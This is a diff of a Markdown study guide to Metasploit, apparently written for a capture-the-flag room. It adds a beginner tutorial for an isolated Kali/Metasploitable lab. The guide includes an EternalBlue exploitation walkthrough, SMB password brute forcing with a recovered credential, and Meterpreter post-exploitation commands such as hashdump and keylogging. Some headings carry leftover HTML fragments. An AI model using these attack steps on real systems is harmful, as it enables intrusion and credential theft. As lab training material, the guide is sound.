@@ -13,19 +13,27 @@ common workflows, and real console examples.
     - [Key Terms](#key-terms)
     - [Module Types](#module-types)
   - [Initial Setup](#initial-setup)
+    - [Sample output (collapsed)](#sample-output-collapsed)
   - [Using Metasploit](#using-metasploit)
     - [Common Options](#common-options)
     - [Unset \& Global Options (`setg`)](#unset--global-options-setg)
   - [Searching \& Info](#searching--info)
+    - [Example: SSH Login Check Scanner (collapsed)](#example-ssh-login-check-scanner-collapsed)
   - [Walkthroughs \& Examples](#walkthroughs--examples)
     - [EternalBlue (MS17-010)](#eternalblue-ms17-010)
+    - [Full console output (collapsed)](#full-console-output-collapsed)
     - [Port \& Service Discovery](#port--service-discovery)
+    - [Sample Nmap output (collapsed)](#sample-nmap-output-collapsed)
     - [SMB Login Brute Force (Scanner)](#smb-login-brute-force-scanner)
+    - [Result snippet (collapsed)](#result-snippet-collapsed)
     - [NetBIOS Enumeration](#netbios-enumeration)
     - [HTTP Version Detection](#http-version-detection)
     - [Finding Files with Meterpreter](#finding-files-with-meterpreter)
   - [Notes \& Good Practice](#notes--good-practice)
   - [Meterpreter](#meterpreter)
+    - [Meterpreter commands](#meterpreter-commands)
+    - [Core commands](#core-commands)
+  - [Beginner Tutorial](#beginner-tutorial)
 
 ---
 
@@ -76,8 +84,7 @@ msfupdate
 msfconsole
 ```
 
-<details>
-<summary><strong>Sample output (collapsed)</strong></summary>
+### Sample output (collapsed)
 
 ```bash
 root@ip-10-10-63-107:~# msfupdate
@@ -131,8 +138,7 @@ msf6 > search type:auxiliary ssh_login
 msf6 > info auxiliary/scanner/ssh/ssh_login
 ```
 
-<details>
-<summary><strong>Example: SSH Login Check Scanner (collapsed)</strong></summary>
+### Example: SSH Login Check Scanner (collapsed)
 
 ```text
 Name: SSH Login Check Scanner
@@ -163,8 +169,7 @@ msf6 exploit(...) > sessions -i 1
 meterpreter >
 ```
 
-<details>
-<summary><strong>Full console output (collapsed)</strong></summary>
+### Full console output (collapsed)</strong></summary>
 
 ```text
 [+] Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 SP1 x64
@@ -200,8 +205,7 @@ Run `nmap` from inside `msfconsole`:
 msf6 > nmap -sS 10.10.108.124
 ```
 
-<details>
-<summary><strong>Sample Nmap output (collapsed)</strong></summary>
+### Sample Nmap output (collapsed)</strong></summary>
 
 ```text
 PORT     STATE SERVICE
@@ -226,8 +230,7 @@ msf6 auxiliary(...) > set PASS_FILE /usr/share/wordlists/MetasploitRoom/Metasplo
 msf6 auxiliary(...) > run
 ```
 
-<details>
-<summary><strong>Result snippet (collapsed)</strong></summary>
+### Result snippet (collapsed)</strong></summary>
 
 ```text
 [+] 10.10.108.124:445 - Success: '.\penny:leo1234'
@@ -246,10 +249,7 @@ msf6 auxiliary(...) > set RHOSTS 10.10.108.124
 msf6 auxiliary(...) > run
 ```
 
-<details>
-<summary><strong>Sample output (collapsed)</strong></summary>
-
-```text
+``` bash
 [+] 10.10.108.124 [] OS:Unix Names:(**MSBROWSE**, , ACME IT SUPPORT) Mac:00:00:00:00:00:00
 ```
 
@@ -265,9 +265,6 @@ msf6 auxiliary(...) > set RHOSTS 10.10.108.124
 msf6 auxiliary(...) > set RPORT 8000
 msf6 auxiliary(...) > run
 ```
-
-<details>
-<summary><strong>Sample output (collapsed)</strong></summary>
 
 ```text
 [+] 10.10.108.124:8000 webfs/1.21 (403-Forbidden)
@@ -286,9 +283,6 @@ meterpreter > cd C:\Users\Jon\Documents
 meterpreter > dir
 meterpreter > cat flag.txt
 ```
-
-<details>
-<summary><strong>Sample output (collapsed)</strong></summary>
 
 ```text
 Found 1 result
@@ -353,7 +347,7 @@ connection types you can have with the target system (Do they allow raw TCP
 connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses
 not as closely monitored as IPv4 addresses? etc.)
 
-Meterpreter commands
+### Meterpreter commands
 
 Core commands will be helpful to navigate and interact with the target system.
 Below are some of the most commonly used. Remember to check all available
@@ -367,7 +361,7 @@ regular user?)
 The ps command will list running processes. The PID column will also give you
 the PID information you will need to migrate Meterpreter to another process.
 
-Core commands
+### Core commands
 
 background: Backgrounds the current session exit: Terminate the Meterpreter
 session guid: Get the session GUID (Globally Unique Identifier) help: Displays
@@ -406,3 +400,212 @@ webcam_snap: Takes a snapshot from the specified webcam webcam_stream: Plays a
 video stream from the specified webcam getsystem: Attempts to elevate your
 privilege to that of local system hashdump: Dumps the contents of the SAM
 database
+
+## Beginner Tutorial
+
+Goal
+
+Set up a tiny offline lab with:
+
+Kali Linux (attacker with Metasploit preinstalled)
+
+Metasploitable 2 (intentionally vulnerable target)
+
+An internal-only network so nothing touches your home/office LAN
+
+Prereqs (quick)
+
+A host PC with ~8–12 GB free RAM and ~40 GB disk
+
+Virtualization app: VirtualBox or VMware Workstation/Player
+
+ISOs/OVAs:
+
+Kali Linux image
+
+Metasploitable 2 VM (usually provided as a ready-made VM)
+
+Keep both VMs offline (no bridged networking).
+
+Create the isolated network
+VirtualBox
+
+File → Tools → Network Manager → Host-only Networks → Create
+
+Note the network (e.g., 192.168.56.0/24). DHCP on is fine.
+
+You’ll use this host-only network for both VMs.
+
+VMware (Player/Workstation)
+
+Edit → Virtual Network Editor
+
+Create or use an existing Host-only network (e.g., VMnet1, 192.168.56.0/24).
+
+Import / Install the VMs
+Metasploitable 2
+
+Import the provided VM (OVA/VMX).
+
+Network adapter: set to Host-only (the one you created).
+
+Kali Linux
+
+Create a new VM and install from the ISO (or import the prebuilt image).
+
+Network adapter: set to Host-only (same network as Metasploitable).
+
+Optional: add a second adapter on Kali as NAT for updates, but disable it when practicing.
+Keep Metasploitable on host-only only.
+
+First boot & IP checks
+
+Start Metasploitable first, then Kali.
+
+On Metasploitable console:
+
+``` bash
+ifconfig     # or: ip a
+
+
+Note the host-only IP (e.g., 192.168.56.101).
+
+On Kali:
+
+ip a
+ping -c 2 192.168.56.101   # confirm reachability
+```
+
+If ping fails:
+
+Ensure both VMs use the same host-only network.
+
+Reboot VMs after changing adapters.
+
+Basic hygiene on Kali
+
+Open a terminal on Kali:
+
+``` bash
+sudo apt update && sudo apt -y upgrade
+msfconsole
+```
+
+In Metasploit:
+
+version
+help
+
+ Recon → Metasploit (non-destructive)
+
+We’ll map services first with nmap,
+then confirm one inside Metasploit using a safe auxiliary module.
+
+5.1 Quick host discovery & service map (Kali terminal)
+
+``` bash
+nmap -sn 192.168.56.0/24        # find hosts on the host-only network
+nmap -sV -O 192.168.56.101      # replace with your Metasploitable IP
+```
+
+Skim open services (FTP/SSH/HTTP/etc.). We’ll pick one to fingerprint safely.
+
+5.2 Start Metasploit and confirm a service banner
+
+Open Metasploit:
+
+``` bash
+msfconsole
+```
+
+Search for a harmless banner grabber, e.g., FTP:
+
+``` bash
+
+search type:auxiliary banner ftp
+use auxiliary/scanner/ftp/ftp_version
+show options
+set RHOSTS 192.168.56.101
+run
+```
+
+You should see the FTP service banner (version string). Try SSH next:
+
+``` bash
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS 192.168.56.101
+run
+```
+
+These auxiliary modules don’t exploit anything; they just read banners.
+Perfect for learning the Metasploit workflow safely:
+search → use → show options → set → run.
+
+Build good habits (tiny checklist)
+
+Read info before running anything.
+
+Keep a lab log (Markdown):
+
+Date, target IP, tools/commands, module names, outputs, what you learned.
+
+Snapshot both VMs now that they’re configured (so you can revert anytime).
+
+Optional quality-of-life
+
+In msfconsole, enable command history timestamps:
+
+``` bash
+irb
+```
+
+not essential, but you can explore; type 'exit' to leave irb
+
+Create resource scripts to replay commands (later):
+
+``` bash
+makerc ~/msf_history.rc
+```
+
+(Then you can resource ~/msf_history.rc to rerun a session’s commands.)
+
+Safety guardrails (non-negotiable)
+
+Keep Metasploitable on host-only. Do not bridge it to your real LAN.
+
+Only scan the lab IPs you control.
+
+Don’t run exploit modules outside this lab.
+
+When done, power off the target VM.
+
+Troubleshooting quick fixes
+
+No IP on host-only: reboot VM; check adapter is indeed Host-only.
+
+Services not responding:
+Metasploitable might take ~a minute to start all services;
+give it a moment, then nmap again.
+
+“Module not found”: update Metasploit:
+
+``` bash
+sudo apt update && sudo apt -y install metasploit-framework
+msfupdate   # if available on your build
+```
+
+What to practice next (still safe)
+
+More banner/Version checks:
+
+``` bash
+auxiliary/scanner/http/http_version
+
+auxiliary/scanner/smb/smb_version
+
+Enumerate HTTP titles/headers:
+
+auxiliary/scanner/http/title
+```
+
+Compare your Metasploit findings to nmap -sV results (consistency check).
